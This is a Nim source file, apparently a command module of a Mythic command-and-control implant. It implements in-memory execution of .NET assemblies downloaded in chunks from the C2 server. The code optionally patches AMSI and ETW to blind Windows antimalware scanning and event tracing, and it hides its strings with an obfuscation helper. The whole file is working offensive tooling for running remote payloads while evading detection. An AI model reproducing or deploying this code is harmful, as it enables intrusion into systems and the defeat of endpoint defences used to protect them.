import json
import ../utils/strenc

when defined(windows):
  import base64
  import winim/clr except `[]`
  import winim/lean
  import ../utils/patches
  import ../utils/strenc
  
  type
    ExecuteAssemblyArgs = object
      uuid: string
      assembly_arguments: string
      patch_amsi_arg: bool
      block_etw_arg: bool

const CHUNK_SIZE = 512000  # 512KB chunks

proc executeAssembly*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a .NET assembly from memory
  ## First response - request the file from Mythic
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("execute-assembly is only supported on Windows")
    }
  else:
    try:
      let args = to(params, ExecuteAssemblyArgs)
      
      # Step 1: Request the assembly file from Mythic
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("file_id"): args.uuid,
          obf("chunk_num"): 1,
          obf("chunk_size"): CHUNK_SIZE,
          obf("full_path"): ""
        }
      }
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to parse execute-assembly parameters: ") & e.msg
      }

proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: string, 
                                   totalChunks: int, currentChunk: int, 
                                   fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the assembly file being downloaded
  when defined(windows):
    try:
      let args = to(params, ExecuteAssemblyArgs)
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("chunk_size"): CHUNK_SIZE,
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("full_path"): ""
          }
        }
      
      # All chunks received - execute the assembly
      var output = obf("Executing .NET assembly from memory...\n")
      
      # Apply patches if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          output.add(obf("[+] AMSI patched successfully!\n"))
        of 1:
          output.add(obf("[-] Failed to patch AMSI\n"))
        of 2:
          output.add(obf("[+] AMSI already patched\n"))
        else:
          discard
      
      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          output.add(obf("[+] ETW patched successfully!\n"))
        of 1:
          output.add(obf("[-] Failed to patch ETW\n"))
        of 2:
          output.add(obf("[+] ETW already patched\n"))
        else:
          discard
      
      # Load the assembly
      output.add(obf("[*] Loading assembly...\n"))
      let assembly = load(fileData)
      
      # Parse arguments
      var assemblyArgs: seq[string] = @[]
      if args.assembly_arguments.len > 0:
        # Split arguments by spaces, respecting quotes
        var inQuote = false
        var currentArg = ""
        for c in args.assembly_arguments:
          if c == '"':
            inQuote = not inQuote
          elif c == ' ' and not inQuote:
            if currentArg.len > 0:
              assemblyArgs.add(currentArg)
              currentArg = ""
          else:
            currentArg.add(c)
        if currentArg.len > 0:
          assemblyArgs.add(currentArg)
      
      # Convert arguments to CLR variant array
      var arr = toCLRVariant(assemblyArgs, VT_BSTR)
      
      output.add(obf("[*] Executing assembly...\n"))
      
      # Redirect Console.WriteLine output
      let mscor = load(obf("mscorlib"))
      let io = load(obf("System.IO"))
      let Console = mscor.GetType(obf("System.Console"))
      let StringWriter = io.GetType(obf("System.IO.StringWriter"))
      
      var sw = @StringWriter.new()
      var oldConsOut = @Console.Out
      @Console.SetOut(sw)
      
      # Execute the assembly
      assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
      
      # Restore console and capture output
      @Console.SetOut(oldConsOut)
      let executionOutput = fromCLRVariant[string](sw.ToString())
      
      if executionOutput.len > 0:
        output.add(obf("\n=== Assembly Output ===\n"))
        output.add(executionOutput)
        output.add(obf("\n======================\n"))
      
      output.add(obf("[+] Assembly execution completed\n"))
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): output
      }
      
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to execute assembly: ") & e.msg
      }
  else:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("execute-assembly is only supported on Windows")
    }
